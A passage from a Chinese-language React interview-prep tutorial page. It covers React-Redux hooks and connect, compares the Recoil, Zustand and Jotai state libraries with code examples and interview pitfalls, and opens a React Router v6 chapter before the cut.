function_">dispatch</span>(<span class="hljs-title function_">deleteTodo</span>(id))<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>connect 使用</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; connect &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-redux&#x27;</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ConnectedTodoList</span> = <span class="hljs-title function_">connect</span>(<br>  mapStateToProps,<br>  mapDispatchToProps<br>)(<span class="hljs-title class_">TodoList</span>);<br></code></pre></td></tr></table></figure><h3 id="高频面试题与破解方案-14"><a href="#高频面试题与破解方案-14" class="headerlink" title="高频面试题与破解方案"></a>高频面试题与破解方案</h3><p><strong>Q：为什么需要 React-Redux？</strong></p><ol><li>解耦组件：避免组件直接依赖 Redux store</li><li>性能优化：自动实现 shouldComponentUpdate 优化</li><li>上下文管理：通过 Provider 优雅注入 store</li><li>简化开发：提供 useSelector&#x2F;useDispatch 便捷 API</li><li>未来兼容：官方维护，保证与 React 新特性兼容</li></ol><p><strong>Q：useSelector 如何避免不必要重渲染？</strong></p><p>优化策略：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 策略1：返回原始值（非引用类型）</span><br><span class="hljs-keyword">const</span> count = <span class="hljs-title function_">useSelector</span>(<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> state.<span class="hljs-property">counter</span>); <span class="hljs-comment">// number</span><br><br><span class="hljs-comment">// 策略2：使用浅比较</span><br><span class="hljs-keyword">const</span> user = <span class="hljs-title function_">useSelector</span>(<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> state.<span class="hljs-property">user</span>, shallowEqual);<br><br><span class="hljs-comment">// 策略3：记忆化选择器</span><br><span class="hljs-keyword">const</span> selectUser = <span class="hljs-title function_">useCallback</span>(<br>  <span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> (&#123; <span class="hljs-attr">name</span>: state.<span class="hljs-property">user</span>.<span class="hljs-property">name</span>, <span class="hljs-attr">id</span>: state.<span class="hljs-property">user</span>.<span class="hljs-property">id</span> &#125;), <br>  []<br>);<br><span class="hljs-keyword">const</span> userInfo = <span class="hljs-title function_">useSelector</span>(selectUser);<br></code></pre></td></tr></table></figure><p><strong>Q：如何在类组件中使用 Hooks？</strong></p><p>解决方案：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 创建连接组件</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">withReduxHooks</span>(<span class="hljs-params">WrappedComponent</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">props</span>) &#123;<br>    <span class="hljs-keyword">const</span> data = <span class="hljs-title function_">useSelector</span>(<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> state.<span class="hljs-property">data</span>);<br>    <span class="hljs-keyword">const</span> dispatch = <span class="hljs-title function_">useDispatch</span>();<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">WrappedComponent</span> &#123;<span class="hljs-attr">...props</span>&#125; <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;data&#125;</span> <span class="hljs-attr">dispatch</span>=<span class="hljs-string">&#123;dispatch&#125;</span> /&gt;</span></span>;<br>  &#125;;<br>&#125;<br><br><span class="hljs-comment">// 使用</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LegacyComponent</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  <span class="hljs-comment">// 通过 props 访问 data 和 dispatch</span><br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">withReduxHooks</span>(<span class="hljs-title class_">LegacyComponent</span>);<br></code></pre></td></tr></table></figure><h3 id="总结：React-Redux-核心知识点"><a href="#总结：React-Redux-核心知识点" class="headerlink" title="总结：React-Redux 核心知识点"></a>总结：React-Redux 核心知识点</h3><table><thead><tr><th align="left">概念</th><th align="left">作用</th><th align="left">最佳实践</th></tr></thead><tbody><tr><td align="left">Provider</td><td align="left">注入 Redux store 到组件树</td><td align="left">包裹整个应用根组件</td></tr><tr><td align="left">useSelector</td><td align="left">从 store 选择状态</td><td align="left">返回原始值 + 精细选择</td></tr><tr><td align="left">useDispatch</td><td align="left">获取 dispatch 方法</td><td align="left">封装动作创建函数</td></tr><tr><td align="left">connect</td><td align="left">类组件连接方案（传统）</td><td align="left">使用 mapState&#x2F;mapDispatch</td></tr><tr><td align="left">记忆化选择器</td><td align="left">优化性能</td><td align="left">使用 reselect 或 useMemo</td></tr><tr><td align="left">Redux Toolkit</td><td align="left">现代 Redux 开发标准</td><td align="left">使用 createSlice + configureStore</td></tr></tbody></table><h2 id="5-5-现代状态管理方案（Recoil、Zustand、Jotai）"><a href="#5-5-现代状态管理方案（Recoil、Zustand、Jotai）" class="headerlink" title="5.5 现代状态管理方案（Recoil、Zustand、Jotai）"></a>5.5 现代状态管理方案（Recoil、Zustand、Jotai）</h2><h3 id="基础知识概述-简要"><a href="#基础知识概述-简要" class="headerlink" title="基础知识概述 (简要)"></a>基础知识概述 (简要)</h3><p>目标： 解决 React 应用中跨组件状态共享和复杂状态逻辑的管理问题，特别是当 Context + useState&#x2F;useReducer 在性能或开发体验上显得不足时。</p><p>核心诉求：</p><ul><li>简化 API： 减少模板代码（boilerplate），提升开发效率。</li><li>高性能更新： 精确控制组件更新范围，避免不必要的渲染。</li><li>更好的 TypeScript 支持： 提供出色的类型推断。</li><li>更自然的 React 集成： 拥抱 Hooks 和 React 的并发特性。</li><li>更小的包体积： 减小应用体积。</li></ul><p>与 Redux 的主要区别：</p><ul><li>通常不需要显式定义 action types, action creators, reducers。</li><li>状态存储和更新逻辑更分散或原子化。</li><li>API 设计更贴近 React Hooks，学习曲线相对平缓。</li></ul><h3 id="Recoil-Meta-官方出品"><a href="#Recoil-Meta-官方出品" class="headerlink" title="Recoil (Meta 官方出品)"></a>Recoil (Meta 官方出品)</h3><p><strong>核心概念： 原子 (Atoms) 和 选择器 (Selectors)</strong></p><ul><li>Atom: 状态的最小单位。一个原子代表一份独立的状态（可以是任何类型）。组件通过 useRecoilState, useRecoilValue, useSetRecoilState 订阅或更新它。原子变化只触发订阅它的组件重渲染。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; atom &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;recoil&#x27;</span>;<br><span class="hljs-keyword">const</span> countState = <span class="hljs-title function_">atom</span>(&#123;<br>  <span class="hljs-attr">key</span>: <span class="hljs-string">&#x27;countState&#x27;</span>, <span class="hljs-comment">// 必须全局唯一</span><br>  <span class="hljs-attr">default</span>: <span class="hljs-number">0</span>, <span class="hljs-comment">// 初始值</span><br>&#125;);<br></code></pre></td></tr></table></figure><ul><li>Selector: 派生状态。基于一个或多个 Atom 或其他 Selector 的值通过纯函数计算得出。组件同样使用 Hook 订阅。依赖的 Atom&#x2F;Selector 变化时自动重新计算，并触发订阅组件更新。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; selector &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;recoil&#x27;</span>;<br><span class="hljs-keyword">const</span> doubledCountState = <span class="hljs-title function_">selector</span>(&#123;<br>  <span class="hljs-attr">key</span>: <span class="hljs-string">&#x27;doubledCountState&#x27;</span>,<br>  <span class="hljs-attr">get</span>: <span class="hljs-function">(<span class="hljs-params">&#123; get &#125;</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> count = <span class="hljs-title function_">get</span>(countState);<br>    <span class="hljs-keyword">return</span> count * <span class="hljs-number">2</span>;<br>  &#125;,<br>  <span class="hljs-comment">// 可选：定义如何设置（会反向更新依赖的 Atom）</span><br>  <span class="hljs-attr">set</span>: <span class="hljs-function">(<span class="hljs-params">&#123; set &#125;, newValue</span>) =&gt;</span> &#123;<br>    <span class="hljs-title function_">set</span>(countState, newValue / <span class="hljs-number">2</span>);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>Hooks API:</strong></p><ul><li>useRecoilState(atom&#x2F;selector)： 类似于 useState，返回 [state, setter]。</li><li>useRecoilValue(atom&#x2F;selector)： 只读取状态值。</li><li>useSetRecoilState(atom&#x2F;selector)： 只获取设置状态的函数。</li><li>useRecoilCallback()： 用于在回调中异步读取&#x2F;更新状态，避免闭包问题。</li></ul><p><strong>关键特性</strong></p><ul><li>细粒度响应： 组件只订阅它真正需要的具体 Atom&#x2F;Selector，状态变化时只有依赖这些状态的组件才会更新。这是解决 Redux 中 connect 或 useSelector 可能导致的“大范围更新”问题的关键。</li><li>Hooks-First API： 完全使用 React Hooks 的方式读取和修改状态，与函数组件无缝集成。</li><li>异步支持： Selector 可以方便地处理异步数据获取和派生状态（如 useRecoilValueLoadable）。</li><li>状态快照与时间旅行： 内置支持状态快照，便于调试（如 <RecoilRoot> 的 initializeState 和快照 API）。</li></ul><p><strong>优点</strong></p><ul><li>概念相对清晰（Atom&#x2F;Selector）。</li><li>细粒度更新性能优秀。</li><li>官方背景，社区和文档较好。</li><li>内置异步支持良好。</li></ul><p><strong>缺点&#x2F;考量</strong></p><ul><li>API 相对复杂： 理解 Atom、Selector 及其各种 Hook（useRecoilCallback, useRecoilValueLoadable, useRecoilTransaction_UNSTABLE 等）需要一定学习成本。</li><li>仍在实验阶段 (Experimental)： 虽然 Meta 内部广泛使用，但官方文档仍标记为 Experimental，API 稳定性有一定风险（尽管重大变更已较少）。</li><li>Bundle Size： 相对其他轻量方案稍大。</li></ul><p><strong>面试要点</strong></p><ul><li>解释 Atom 和 Selector 的区别和联系。</li><li>如何用 Selector 处理异步数据？</li><li>Recoil 如何实现细粒度更新？（依赖图追踪）</li><li>对比 Recoil 与 Context + useState&#x2F;useReducer 在性能上的差异（Context 更新会触发所有消费组件更新，Recoil 只更新依赖特定 Atom&#x2F;Selector 的组件）。</li><li>了解 atomFamily &#x2F; selectorFamily 的作用（参数化状态）。</li></ul><h3 id="Zustand"><a href="#Zustand" class="headerlink" title="Zustand"></a>Zustand</h3><p><strong>核心思想</strong>：创建一个单一的、不可变的 Store。Store 包含状态和修改状态的方法（Action）。API 极其简洁。</p><p><strong>核心 API（create）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> create <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;zustand&#x27;</span>;<br><span class="hljs-comment">// 类型提示 (TypeScript): import &#123; create &#125; from &#x27;zustand&#x27;</span><br><span class="hljs-keyword">const</span> useStore = <span class="hljs-title function_">create</span>(<span class="hljs-function">(<span class="hljs-params">set, get</span>) =&gt;</span> (&#123;<br>  <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">increment</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">set</span>(<span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> (&#123; <span class="hljs-attr">count</span>: state.<span class="hljs-property">count</span> + <span class="hljs-number">1</span> &#125;)),<br>  <span class="hljs-attr">decrement</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">set</span>(<span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> (&#123; <span class="hljs-attr">count</span>: state.<span class="hljs-property">count</span> - <span class="hljs-number">1</span> &#125;)),<br>  <span class="hljs-attr">reset</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">set</span>(&#123; <span class="hljs-attr">count</span>: <span class="hljs-number">0</span> &#125;),<br>  <span class="hljs-comment">// 访问当前状态 (非更新时): get().count</span><br>  <span class="hljs-comment">// 异步 Action 示例</span><br>  <span class="hljs-keyword">async</span> <span class="hljs-attr">fetchData</span>: <span class="hljs-title function_">async</span> () =&gt; &#123;<br>    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/data&#x27;</span>);<br>    <span class="hljs-title function_">set</span>(&#123; <span class="hljs-attr">data</span>: <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>() &#125;); <span class="hljs-comment">// 更新状态</span><br>  &#125;<br>&#125;));<br></code></pre></td></tr></table></figure><p><strong>Hooks API</strong></p><ul><li>useStore()： 默认会订阅整个 Store 的变化（不推荐，可能导致过多渲染）。</li><li>useStore(selector)： 推荐用法。通过一个选择器函数从 Store 中选取需要的部分状态或 Action。组件只在选择器返回的部分发生变化时才会重新渲染。Zustand 会对选择器结果进行严格的浅比较 (Object.is)。使用选择器函数是性能优化的关键。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 组件A: 只需要 count 和 increment</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">CounterA</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; count, increment &#125; = <span class="hljs-title function_">useStore</span>(<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> (&#123;<br>    <span class="hljs-attr">count</span>: state.<span class="hljs-property">count</span>,<br>    <span class="hljs-attr">increment</span>: state.<span class="hljs-property">increment</span><br>  &#125;));<br>  <span class="hljs-comment">// ... render</span><br>&#125;<br><span class="hljs-comment">// 组件B: 只需要 decrement</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">CounterB</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> decrement = <span class="hljs-title function_">useStore</span>(<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> state.<span class="hljs-property">decrement</span>);<br>  <span class="hljs-comment">// ... render</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>关键特性&#x2F;优势</strong></p><ul><li>极致简洁： API 极其精简，学习成本低，样板代码极少。</li><li>高性能： 精确的订阅机制（通过选择器）确保组件只在相关状态变化时更新。</li><li>无 Provider 地狱： Store 是全局单例（虽然可以创建多个 Store），不需要用 Context Provider 包裹应用根节点。组件可以直接在任何地方使用 useStore。</li><li>Middleware 支持： 内置支持中间件（如 persist 持久化、immer 简化不可变更新、devtools 连接 Redux DevTools）。</li><li>出色的 TS 支持： 类型推断非常友好。</li></ul><p><strong>适用场景</strong></p><ul><li>绝大多数应用场景，特别是追求简洁、高效、易用的项目。从中小型到大型项目都适用。是目前非常流行的 Redux 替代品。</li></ul><h3 id="Jotai"><a href="#Jotai" class="headerlink" title="Jotai"></a>Jotai</h3><p><strong>核心思想</strong>： 受 Recoil 的 Atom 概念启发，但 API 设计更精简和原始（Primitive）。完全拥抱 React 的 Context 和 Hooks 思想。</p><p><strong>核心概念</strong></p><ul><li>Atom: 状态的基本单位。定义一个包含初始值的 Atom（不需要唯一的全局 key！）。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; atom &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;jotai&#x27;</span>;<br><span class="hljs-keyword">const</span> countAtom = <span class="hljs-title function_">atom</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// 初始值</span><br></code></pre></td></tr></table></figure><ul><li>Derived Atom: 通过读取其他 Atom 的值计算而来。可以是只读的或可写的（通过定义一个 get 函数和一个可选的 set 函数）。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> doubledCountAtom = <span class="hljs-title function_">atom</span>(<span class="hljs-function">(<span class="hljs-params">get</span>) =&gt;</span> <span class="hljs-title function_">get</span>(countAtom) * <span class="hljs-number">2</span>); <span class="hljs-comment">// 只读派生</span><br><span class="hljs-comment">// 可写派生 (set 会更新依赖的原始 atom)</span><br><span class="hljs-keyword">const</span> countPlusOneAtom = <span class="hljs-title function_">atom</span>(<br>  <span class="hljs-function">(<span class="hljs-params">get</span>) =&gt;</span> <span class="hljs-title function_">get</span>(countAtom) + <span class="hljs-number">1</span>, <span class="hljs-comment">// getter</span><br>  <span class="hljs-function">(<span class="hljs-params">get, set, newValue</span>) =&gt;</span> &#123; <span class="hljs-title function_">set</span>(countAtom, newValue - <span class="hljs-number">1</span>) &#125; <span class="hljs-comment">// setter</span><br>);<br></code></pre></td></tr></table></figure><p><strong>Hooks API</strong></p><ul><li>useAtom(atom)： 核心 Hook。返回 [value, setter]。组件会订阅传递给 useAtom 的这个特定 Atom 的变化。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Counter</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useAtom</span>(countAtom);<br>  <span class="hljs-comment">// ... render</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Provider 与 Context</strong></p><ul><li>默认情况下，Atom 状态是全局共享的（通过 Jotai 内部的默认 Context）。</li><li>Provider： 如果需要创建隔离的状态作用域（例如在微前端、测试或需要多个独立实例的场景），可以使用 <code>&lt;Provider&gt;</code> 包裹组件树。Provider 内的组件访问的是该 Provider 作用域内的 Atom 状态。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Provider</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;jotai&#x27;</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Provider</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ComponentThatUsesAtoms</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Provider</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>关键特性&#x2F;优势</strong></p><ul><li>极简 API： 核心 API 只有 atom 和 useAtom。概念极其精简。</li><li>灵活的组合性： Atom 可以自由组合，构建复杂状态逻辑。</li><li>无 Key 设计： 不需要为 Atom 定义全局唯一的 key，简化了定义和使用。</li><li>基于 Context： 底层利用 React Context 实现，但通过优化避免了 Context 的渲染爆炸问题。Provider 提供了状态隔离能力。</li><li>轻量级： 包体积非常小。</li><li>优秀的并发模式兼容性。</li></ul><p><strong>适用场景</strong></p><ul><li>喜欢极简 API、原子化思想，且可能需要状态隔离（Provider）的项目。中小型到大型项目均可。</li></ul><h3 id="对比与选型建议-面试高频"><a href="#对比与选型建议-面试高频" class="headerlink" title="对比与选型建议 (面试高频)"></a>对比与选型建议 (面试高频)</h3><table><thead><tr><th align="left">特性</th><th align="left">Recoil</th><th align="left">Zustand</th><th align="left">Jotai</th></tr></thead><tbody><tr><td align="left">核心模型</td><td align="left">Atoms + Selectors (Graph)</td><td align="left">Centralized Store + Actions</td><td align="left">Atoms (Primitive)</td></tr><tr><td align="left">API 复杂度</td><td align="left">中等 (概念较多)</td><td align="left">极低 (非常简洁)</td><td align="left">很低 (极其精简)</td></tr><tr><td align="left">学习曲线</td><td align="left">中等偏上</td><td align="left">低</td><td align="left">低</td></tr><tr><td align="left">状态更新粒度</td><td align="left">细粒度 (Atom&#x2F;Selector 级)</td><td align="left">细粒度 (Selector 函数级)</td><td align="left">细粒度 (Atom 级)</td></tr><tr><td align="left">Provider 要求</td><td align="left"><code>&lt;RecoilRoot&gt;</code> 必需</td><td align="left">不需要 (全局 Store)</td><td align="left">可选 (默认全局，可隔离)</td></tr><tr><td align="left">异步处理</td><td align="left">强大 (Selector + Suspense)</td><td align="left">良好 (在 Action 中处理)</td><td align="left">良好 (在 Atom 或 Effect 中处理)</td></tr><tr><td align="left">TypeScript</td><td align="left">优秀</td><td align="left">极佳</td><td align="left">极佳</td></tr><tr><td align="left">包体积</td><td align="left">较大</td><td align="left">很小</td><td align="left">极小</td></tr><tr><td align="left">开发体验 (DX)</td><td align="left">好 (Meta 工具)</td><td align="left">极佳 (简洁，DevTools)</td><td align="left">极佳 (简洁)</td></tr><tr><td align="left">适用规模</td><td align="left">大型 &#x2F; 复杂派生状态</td><td align="left">全规模 (尤其推荐)</td><td align="left">全规模 (推荐中小到中大型)</td></tr><tr><td align="left">类似库</td><td align="left">-</td><td align="left">Valtio, React Tracked</td><td align="left">Recoil (简化版)</td></tr></tbody></table><h3 id="面试踩坑点与高频问题"><a href="#面试踩坑点与高频问题" class="headerlink" title="面试踩坑点与高频问题"></a>面试踩坑点与高频问题</h3><ul><li>useRecoilValueLoadable 状态 (state, contents)? Recoil 异步 Selector 使用 useRecoilValueLoadable 获取 Loadable 对象，其 state 表示状态 (‘hasValue’, ‘loading’, ‘hasError’)，contents 包含实际值或 Error 对象。</li><li>Zustand 性能关键 (selector 函数)： 务必使用带选择器函数的 useStore(selector) 来避免订阅整个 Store 导致的无效渲染。强调选择器结果变化才会触发渲染。</li><li>Jotai 的 Provider 作用： 理解默认全局 Context 和 <Provider> 创建隔离作用域的区别及适用场景（微前端、测试、组件库）。</li><li>不可变更新 (所有库)： 虽然 Zustand 和 Jotai 在 set 时可以“直接修改”，但最佳实践仍是保持不可变性（尤其数组&#x2F;对象），以避免潜在的渲染问题或 DevTools 跟踪问题。Zustand 常配合 immer 中间件。</li><li>闭包陷阱 (异步 Action)： 在 Zustand&#x2F;Jotai 的异步 Action 中，如果依赖当前状态进行计算，应使用 get() 函数 (Zustand) 或 get 参数 (Jotai 的 Atom set)，而不是直接读取闭包中的旧状态值。<ul><li>错误示例 (Zustand 闭包陷阱):</li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ❌ 错误：闭包可能捕获旧的 count</span><br><span class="hljs-keyword">const</span> useStore = <span class="hljs-title function_">create</span>(<span class="hljs-function">(<span class="hljs-params">set</span>) =&gt;</span> (&#123;<br>  <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">incrementAsync</span>: <span class="hljs-title function_">async</span> () =&gt; &#123;<br>    <span class="hljs-keyword">await</span> <span class="hljs-title function_">delay</span>(<span class="hljs-number">1000</span>);<br>    <span class="hljs-title function_">set</span>(&#123; <span class="hljs-attr">count</span>: count + <span class="hljs-number">1</span> &#125;); <span class="hljs-comment">// 这里的 `count` 是创建时的初始值 0！</span><br>  &#125;<br>&#125;));<br></code></pre></td></tr></table></figure><ul><li>正确做法 (使用 get):</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ✅ 正确：通过 get 访问最新状态</span><br><span class="hljs-keyword">const</span> useStore = <span class="hljs-title function_">create</span>(<span class="hljs-function">(<span class="hljs-params">set, get</span>) =&gt;</span> (&#123;<br>  <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">incrementAsync</span>: <span class="hljs-title function_">async</span> () =&gt; &#123;<br>    <span class="hljs-keyword">await</span> <span class="hljs-title function_">delay</span>(<span class="hljs-number">1000</span>);<br>    <span class="hljs-title function_">set</span>(&#123; <span class="hljs-attr">count</span>: <span class="hljs-title function_">get</span>().<span class="hljs-property">count</span> + <span class="hljs-number">1</span> &#125;); <span class="hljs-comment">// 获取当前最新值</span><br>  &#125;<br>&#125;));<br></code></pre></td></tr></table></figure><ul><li>与 React 18 并发特性的兼容性： 强调 Recoil 和 Jotai 在设计上考虑了并发渲染。Zustand 也基本兼容，但需注意在严格模式下的双重渲染可能带来的副作用问题（可通过中间件或状态稳定化处理）。</li><li>为什么不用 Context 代替？ Context 在状态更新时会导致所有消费该 Context 的组件重新渲染，无论它们是否依赖于变化的那部分状态。这在频繁更新或大型状态对象时性能极差。Recoil&#x2F;Zustand&#x2F;Jotai 都通过订阅机制实现了细粒度更新。</li></ul><h1 id="第六章：React-Router-与数据请求"><a href="#第六章：React-Router-与数据请求" class="headerlink" title="第六章：React Router 与数据请求"></a>第六章：React Router 与数据请求</h1><h2 id="6-1-React-Router-基础（BrowserRouter、Route、Link）"><a href="#6-1-React-Router-基础（BrowserRouter、Route、Link）" class="headerlink" title="6.1 React Router 基础（BrowserRouter、Route、Link）"></a>6.1 React Router 基础（BrowserRouter、Route、Link）</h2><h3 id="基础概念（简要）"><a href="#基础概念（简要）" class="headerlink" title="基础概念（简要）"></a>基础概念（简要）</h3><p><strong>SPA 路由原理</strong></p><ul><li>在单页应用中，路由切换不会触发页面刷新</li><li>通过监听 URL 变化（hash 或 history API），动态渲染对应组件</li><li>保持应用状态的同时实现视图切换</li></ul><p><strong>React Router 核心作用</strong></p><ul><li>声明式路由配置</li><li>URL 与组件的映射关系管理</li><li>导航控制（声明式 <code>&lt;Link&gt;</code> 和编程式 navigate）</li></ul><h3 id="核心组件深度解析（React-Router-v6）"><a href="#核心组件深度解析（React-Router-v6）" class="headerlink" title="核心组件深度解析（React Router v6）"></a>核心组件深度解析（React Router v6）</h3><p><strong><code>&lt;BrowserRouter&gt;</code></strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 入口文件 index.js</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">BrowserRouter</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-router-dom&#x27;</span>;<br><br><span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">createRoot</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;root&#x27;</span>)).<span class="hljs-title function_">render</span>(<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">BrowserRouter</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">BrowserRouter</span>&gt;</span></span><br>);<br></code></pre></td></tr></table></figure><ul><li>作用：使用 HTML5 History API (pushState, replaceState) 管理路由</li><li>特点：<ul><li>URL 格式为干净的路径（如 &#x2F;dashboard）</li><li>需要服务器配合：所有路由请求需返回 index.html</li><li>面试坑点：直接访问子路由出现 404 的解决方案（配置服务器 fallback）</li></ul></li></ul><p><strong><code>&lt;Routes&gt;</code> 与 <code>&lt;Route&gt;</code></strong></p><figure 